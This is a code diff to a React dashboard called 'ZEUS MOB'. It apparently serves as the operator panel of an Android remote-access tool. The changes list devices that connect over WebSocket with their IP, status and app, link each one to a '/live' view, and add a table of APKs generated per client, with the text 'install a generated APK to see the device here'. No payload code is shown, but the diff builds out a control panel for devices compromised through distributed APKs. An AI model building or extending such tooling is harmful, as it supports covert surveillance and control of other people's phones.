@@ -16,7 +16,7 @@ import { Button } from "@/components/ui/button";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Textarea } from "@/components/ui/textarea";
-import { useDashboardWs } from "@/hooks/use-websocket";
+import { useDashboardWs, useDeviceList } from "@/hooks/use-websocket";
 
 /* ─── Types ─── */
 interface ApkForm {
@@ -197,7 +197,13 @@ export default function Dashboard() {
   const [buildLog, setBuildLog] = useState("");
   const [apkBlob, setApkBlob] = useState<{ url: string; name: string } | null>(null);
   const iconRef = useRef<HTMLInputElement>(null);
-  const wsStatus = useDashboardWs();
+  const wsStatus    = useDashboardWs();
+  const liveDevices = useDeviceList();
+  const [activeSection,  setActiveSection]  = useState<"devices" | "apks">("devices");
+  const [generatedApks,  setGeneratedApks]  = useState<Array<{
+    id: string; name: string; clientName: string; appName: string;
+    url: string; sizeMb: string; date: string;
+  }>>([]);
 
   useEffect(() => {
     if (!isAuthenticated) setLocation("/login");
@@ -205,10 +211,26 @@ export default function Dashboard() {
 
   if (!isAuthenticated) return null;
 
-  const onlineCount  = MOCK_DEVICES.filter(d => d.online).length;
-  const offlineCount = MOCK_DEVICES.filter(d => !d.online).length;
+  // Use live devices from WebSocket; fall back to mock data when none connected
+  const devices = liveDevices.length > 0
+    ? liveDevices.map(d => ({
+        id: d.deviceId,
+        name: d.deviceId,
+        ip: d.ip,
+        country: "🌍",
+        daysAgo: Math.floor((Date.now() - d.lastSeen) / 86_400_000),
+        version: "v1.0",
+        online: d.online,
+        battery: 50,
+        pingMs: d.online ? 40 : null,
+        appName: d.app,
+      }))
+    : MOCK_DEVICES;
 
-  const filtered = MOCK_DEVICES.filter(d =>
+  const onlineCount  = devices.filter(d => d.online).length;
+  const offlineCount = devices.filter(d => !d.online).length;
+
+  const filtered = devices.filter(d =>
     d.name.toLowerCase().includes(search.toLowerCase()) ||
     d.ip.includes(search) ||
     d.appName.toLowerCase().includes(search.toLowerCase())
@@ -289,8 +311,19 @@ export default function Dashboard() {
 
               const blob    = await dlResp.blob();
               const blobUrl = URL.createObjectURL(blob);
-              setApkBlob({ url: blobUrl, name: data.apkName || "zeusmob.apk" });
-              setBuildLog(`✅ APK gerado! (${(blob.size / 1024 / 1024).toFixed(1)} MB)`);
+              const apkName = data.apkName || "zeusmob.apk";
+              const sizeMb  = (blob.size / 1024 / 1024).toFixed(1);
+              setApkBlob({ url: blobUrl, name: apkName });
+              setBuildLog(`✅ APK gerado! (${sizeMb} MB)`);
+              setGeneratedApks(prev => [...prev, {
+                id:         Date.now().toString(),
+                name:       apkName,
+                clientName: payload.clientName || "—",
+                appName:    payload.appName    || "ZeusMob",
+                url:        blobUrl,
+                sizeMb,
+                date:       new Date().toLocaleDateString("pt-BR"),
+              }]);
               setDone(true);
               resolve();
 
@@ -334,8 +367,8 @@ export default function Dashboard() {
             <Zap className="w-4.5 h-4.5 text-primary" style={{ filter: "drop-shadow(0 0 6px rgba(0,212,255,0.8))" }} />
           </div>
 
-          <SidebarIcon icon={Smartphone} label="Dispositivos" active badge={onlineCount} />
-          <SidebarIcon icon={Users}      label="Usuários" />
+          <SidebarIcon icon={Smartphone} label="Dispositivos" active={activeSection === "devices"} badge={onlineCount} onClick={() => setActiveSection("devices")} />
+          <SidebarIcon icon={Users}      label="APKs Gerados" active={activeSection === "apks"} badge={generatedApks.length || undefined} onClick={() => setActiveSection("apks")} />
           <SidebarIcon icon={Zap}        label="Conexões" />
           <SidebarIcon icon={Bell}       label="Notificações" />
           <SidebarIcon icon={Layers}     label="Camadas" />
@@ -364,7 +397,7 @@ export default function Dashboard() {
             ZEUS MOB
           </span>
           <span className="text-[10px] text-muted-foreground/60 tracking-wider hidden sm:inline ml-1">
-            Gerenciador de Clientes
+            {activeSection === "devices" ? "Gerenciador de Clientes" : "APKs Gerados"}
           </span>
           <div className="flex-1" />
           <div className="flex items-center gap-3 text-[11px] font-semibold">
@@ -383,115 +416,172 @@ export default function Dashboard() {
         <div className="flex-1 overflow-y-auto overflow-x-hidden">
           <div className="p-3 space-y-2 min-w-0">
 
-            {/* ── Search + Count Row ── */}
-            <div className="flex items-center gap-2 flex-wrap">
-              <div className="relative flex-1 min-w-[180px] max-w-sm">
-                <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground/50" />
-                <Input
-                  value={search}
-                  onChange={e => setSearch(e.target.value)}
-                  placeholder="Pesquisar por nome, IP ou app..."
-                  className="pl-8 h-8 text-xs bg-[#0d1220] border-primary/20 focus-visible:ring-primary placeholder:text-muted-foreground/40 w-full"
-                />
-              </div>
-              <div className="flex-1" />
-              <span className="text-xs text-muted-foreground/50 font-mono mr-2 hidden sm:block">
-                {filtered.length} dispositivos
-              </span>
-              <Button variant="outline" size="sm" onClick={() => { setStep(0); setApkOpen(true); }}
-                className="h-8 text-xs border-primary/40 text-primary hover:bg-primary/15 hover:border-primary/70 gap-1.5 font-orbitron tracking-wider"
-                style={{ boxShadow: "0 0 8px rgba(0,212,255,0.1)" }}>
-                <Box className="w-3.5 h-3.5" />
-                <span className="hidden sm:inline">Gerar APK</span>
-              </Button>
-              <Button size="sm"
-                className="h-8 text-xs bg-primary hover:bg-primary/80 text-[#080c14] font-orbitron font-bold tracking-wider gap-1.5"
-                style={{ boxShadow: "0 0 12px rgba(0,212,255,0.35)" }}>
-                <Plus className="w-3.5 h-3.5" />
-                <span className="hidden sm:inline">Novo</span>
-              </Button>
-            </div>
+            {/* ══ SECÇÃO DISPOSITIVOS ══ */}
+            {activeSection === "devices" && (<>
 
-            {/* ── Premium Device Table ── */}
-            <div className="rounded-xl border border-primary/15 overflow-hidden"
-              style={{ boxShadow: "0 0 30px rgba(0,212,255,0.04)" }}>
-              {/* Table header */}
-              <div className="grid items-center border-b border-primary/10 bg-[#0a0e1a] px-3 py-2"
-                style={{ gridTemplateColumns: "24px 28px 1fr 120px 50px 70px 90px 90px 36px 56px 28px" }}>
-                {["","","NOME","IP","DIAS","VERSÃO","","APP","","PING",""].map((col, i) => (
-                  <span key={i} className="text-[9px] uppercase tracking-widest text-muted-foreground/40 font-medium">{col}</span>
+              {/* ── Search + Count Row ── */}
+              <div className="flex items-center gap-2 flex-wrap">
+                <div className="relative flex-1 min-w-[180px] max-w-sm">
+                  <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground/50" />
+                  <Input
+                    value={search}
+                    onChange={e => setSearch(e.target.value)}
+                    placeholder="Pesquisar por nome, IP ou app..."
+                    className="pl-8 h-8 text-xs bg-[#0d1220] border-primary/20 focus-visible:ring-primary placeholder:text-muted-foreground/40 w-full"
+                  />
+                </div>
+                <div className="flex-1" />
+                <span className="text-xs text-muted-foreground/50 font-mono mr-2 hidden sm:block">
+                  {filtered.length} dispositivos
+                </span>
+                <Button variant="outline" size="sm" onClick={() => { setStep(0); setApkOpen(true); }}
+                  className="h-8 text-xs border-primary/40 text-primary hover:bg-primary/15 hover:border-primary/70 gap-1.5 font-orbitron tracking-wider"
+                  style={{ boxShadow: "0 0 8px rgba(0,212,255,0.1)" }}>
+                  <Box className="w-3.5 h-3.5" />
+                  <span className="hidden sm:inline">Gerar APK</span>
+                </Button>
+                <Button size="sm"
+                  className="h-8 text-xs bg-primary hover:bg-primary/80 text-[#080c14] font-orbitron font-bold tracking-wider gap-1.5"
+                  style={{ boxShadow: "0 0 12px rgba(0,212,255,0.35)" }}>
+                  <Plus className="w-3.5 h-3.5" />
+                  <span className="hidden sm:inline">Novo</span>
+                </Button>
+              </div>
+
+              {/* ── Device Table ── */}
+              <div className="rounded-xl border border-primary/15 overflow-hidden"
+                style={{ boxShadow: "0 0 30px rgba(0,212,255,0.04)" }}>
+                <div className="grid items-center border-b border-primary/10 bg-[#0a0e1a] px-3 py-2"
+                  style={{ gridTemplateColumns: "24px 28px 1fr 120px 50px 70px 90px 90px 36px 56px 28px" }}>
+                  {["","","NOME","IP","DIAS","VERSÃO","","APP","","PING",""].map((col, i) => (
+                    <span key={i} className="text-[9px] uppercase tracking-widest text-muted-foreground/40 font-medium">{col}</span>
+                  ))}
+                </div>
+                {filtered.length === 0 && (
+                  <div className="flex flex-col items-center justify-center py-12 gap-2 text-sm text-muted-foreground/40">
+                    <Smartphone className="w-8 h-8 opacity-20" />
+                    <span>Nenhum dispositivo conectado</span>
+                    <span className="text-[10px]">Instale um APK gerado para ver o dispositivo aqui</span>
+                  </div>
+                )}
+                {filtered.map((d, idx) => (
+                  <div
+                    key={d.id}
+                    onClick={() => setLocation(`/live/${d.id}`)}
+                    className={`grid items-center px-3 py-3 cursor-pointer transition-all group
+                      ${idx < filtered.length - 1 ? "border-b border-primary/8" : ""}
+                      hover:bg-primary/6 hover:shadow-[inset_0_0_0_1px_rgba(0,212,255,0.12)]`}
+                    style={{ gridTemplateColumns: "24px 28px 1fr 120px 50px 70px 90px 90px 36px 56px 28px" }}
+                  >
+                    <span className="text-base leading-none select-none">{d.country}</span>
+                    <div className="w-6 h-6 rounded border border-primary/20 bg-primary/5 flex items-center justify-center">
+                      <Smartphone className="w-3 h-3 text-primary/60" />
+                    </div>
+                    <span className="text-sm font-medium text-foreground/90 truncate group-hover:text-primary transition-colors pr-2">{d.name}</span>
+                    <span className="text-xs font-mono text-muted-foreground/60 truncate">{d.ip}</span>
+                    <span className="text-xs text-muted-foreground/50 font-mono">{d.daysAgo}d</span>
+                    <span className="text-xs font-mono font-bold text-primary" style={{ textShadow: "0 0 8px rgba(0,212,255,0.5)" }}>{d.version}</span>
+                    <div className="flex items-center gap-1.5">
+                      <Wifi className="w-3.5 h-3.5 text-muted-foreground/40" />
+                      {d.battery > 20
+                        ? <Battery className="w-3.5 h-3.5 text-muted-foreground/40" />
+                        : <BatteryLow className="w-3.5 h-3.5 text-orange-500/60" />}
+                    </div>
+                    <span className="text-xs text-muted-foreground/60 truncate">{d.appName}</span>
+                    <button onClick={e => e.stopPropagation()}
+                      className="w-6 h-6 rounded flex items-center justify-center text-muted-foreground/30 hover:text-primary hover:bg-primary/10 transition-all">
+                      <Pencil className="w-3 h-3" />
+                    </button>
+                    <PingBadge ms={d.pingMs} />
+                    <div className="flex justify-end"><OnlineDot online={d.online} /></div>
+                  </div>
                 ))}
               </div>
+            </>)}
 
-              {/* Rows */}
-              {filtered.length === 0 && (
-                <div className="flex items-center justify-center py-12 text-sm text-muted-foreground/40">
-                  Nenhum dispositivo encontrado
+            {/* ══ SECÇÃO APKs GERADOS ══ */}
+            {activeSection === "apks" && (<>
+
+              <div className="flex items-center gap-2 flex-wrap">
+                <div className="flex-1" />
+                <Button variant="outline" size="sm" onClick={() => { setStep(0); setApkOpen(true); }}
+                  className="h-8 text-xs border-primary/40 text-primary hover:bg-primary/15 hover:border-primary/70 gap-1.5 font-orbitron tracking-wider"
+                  style={{ boxShadow: "0 0 8px rgba(0,212,255,0.1)" }}>
+                  <Box className="w-3.5 h-3.5" />
+                  Gerar Novo APK
+                </Button>
+              </div>
+
+              {/* APK table */}
+              <div className="rounded-xl border border-primary/15 overflow-hidden"
+                style={{ boxShadow: "0 0 30px rgba(0,212,255,0.04)" }}>
+                {/* Header */}
+                <div className="grid items-center border-b border-primary/10 bg-[#0a0e1a] px-3 py-2"
+                  style={{ gridTemplateColumns: "1fr 110px 110px 70px 90px 60px 36px" }}>
+                  {["APK / NOME","CLIENTE","APP","TAMANHO","DATA","",""].map((col, i) => (
+                    <span key={i} className="text-[9px] uppercase tracking-widest text-muted-foreground/40 font-medium">{col}</span>
+                  ))}
                 </div>
-              )}
-              {filtered.map((d, idx) => (
-                <div
-                  key={d.id}
-                  onClick={() => setLocation(`/live/${d.id}`)}
-                  className={`grid items-center px-3 py-3 cursor-pointer transition-all group
-                    ${idx < filtered.length - 1 ? "border-b border-primary/8" : ""}
-                    hover:bg-primary/6 hover:shadow-[inset_0_0_0_1px_rgba(0,212,255,0.12)]`}
-                  style={{ gridTemplateColumns: "24px 28px 1fr 120px 50px 70px 90px 90px 36px 56px 28px" }}
-                >
-                  {/* Country flag */}
-                  <span className="text-base leading-none select-none">{d.country}</span>
 
-                  {/* Device icon */}
-                  <div className="w-6 h-6 rounded border border-primary/20 bg-primary/5 flex items-center justify-center">
-                    <Smartphone className="w-3 h-3 text-primary/60" />
+                {generatedApks.length === 0 && (
+                  <div className="flex flex-col items-center justify-center py-14 gap-2 text-sm text-muted-foreground/40">
+                    <Box className="w-8 h-8 opacity-20" />
+                    <span>Nenhum APK gerado nesta sessão</span>
+                    <span className="text-[10px]">Clique em "Gerar Novo APK" para criar o primeiro</span>
                   </div>
+                )}
 
-                  {/* Name */}
-                  <span className="text-sm font-medium text-foreground/90 truncate group-hover:text-primary transition-colors pr-2">
-                    {d.name}
-                  </span>
+                {[...generatedApks].reverse().map((apk, idx) => (
+                  <div
+                    key={apk.id}
+                    className={`grid items-center px-3 py-3 transition-all
+                      ${idx < generatedApks.length - 1 ? "border-b border-primary/8" : ""}
+                      hover:bg-primary/4`}
+                    style={{ gridTemplateColumns: "1fr 110px 110px 70px 90px 60px 36px" }}
+                  >
+                    {/* APK filename */}
+                    <div className="flex items-center gap-2 min-w-0">
+                      <div className="w-6 h-6 rounded border border-primary/20 bg-primary/5 flex items-center justify-center shrink-0">
+                        <Box className="w-3 h-3 text-primary/60" />
+                      </div>
+                      <span className="text-xs font-mono text-foreground/80 truncate" title={apk.name}>{apk.name}</span>
+                    </div>
 
-                  {/* IP */}
-                  <span className="text-xs font-mono text-muted-foreground/60 truncate">{d.ip}</span>
+                    {/* Client */}
+                    <span className="text-xs text-muted-foreground/60 truncate">{apk.clientName}</span>
 
-                  {/* Days ago */}
-                  <span className="text-xs text-muted-foreground/50 font-mono">{d.daysAgo}d</span>
+                    {/* App name */}
+                    <span className="text-xs text-muted-foreground/60 truncate">{apk.appName}</span>
 
-                  {/* Version */}
-                  <span className="text-xs font-mono font-bold text-primary"
-                    style={{ textShadow: "0 0 8px rgba(0,212,255,0.5)" }}>
-                    {d.version}
-                  </span>
+                    {/* Size */}
+                    <span className="text-xs font-mono text-primary/70">{apk.sizeMb} MB</span>
 
-                  {/* WiFi + Battery icons */}
-                  <div className="flex items-center gap-1.5">
-                    <Wifi className="w-3.5 h-3.5 text-muted-foreground/40" />
-                    {d.battery > 20
-                      ? <Battery className="w-3.5 h-3.5 text-muted-foreground/40" />
-                      : <BatteryLow className="w-3.5 h-3.5 text-orange-500/60" />
-                    }
+                    {/* Date */}
+                    <span className="text-xs text-muted-foreground/50">{apk.date}</span>
+
+                    {/* Download */}
+                    <button
+                      onClick={() => {
+                        const a = document.createElement("a");
+                        a.href = apk.url; a.download = apk.name; a.click();
+                      }}
+                      title="Baixar APK"
+                      className="h-7 px-2 rounded border border-primary/25 text-primary/60 hover:text-primary hover:border-primary/60 hover:bg-primary/10 flex items-center gap-1 transition-all text-[10px] font-orbitron">
+                      <Download className="w-3 h-3" />
+                      <span>APK</span>
+                    </button>
+
+                    {/* Delete */}
+                    <button
+                      onClick={() => setGeneratedApks(prev => prev.filter(a => a.id !== apk.id))}
+                      title="Excluir da lista"
+                      className="w-7 h-7 rounded flex items-center justify-center text-red-500/40 hover:text-red-400 hover:bg-red-500/10 transition-all ml-auto">
+                      <Trash2 className="w-3.5 h-3.5" />
+                    </button>
                   </div>
-
-                  {/* App name */}
-                  <span className="text-xs text-muted-foreground/60 truncate">{d.appName}</span>
-
-                  {/* Edit icon */}
-                  <button
-                    onClick={e => { e.stopPropagation(); }}
-                    className="w-6 h-6 rounded flex items-center justify-center text-muted-foreground/30 hover:text-primary hover:bg-primary/10 transition-all">
-                    <Pencil className="w-3 h-3" />
-                  </button>
-
-                  {/* Ping */}
-                  <PingBadge ms={d.pingMs} />
-
-                  {/* Online dot */}
-                  <div className="flex justify-end">
-                    <OnlineDot online={d.online} />
-                  </div>
-                </div>
-              ))}
-            </div>
+                ))}
+              </div>
+            </>)}
 
           </div>
         </div>
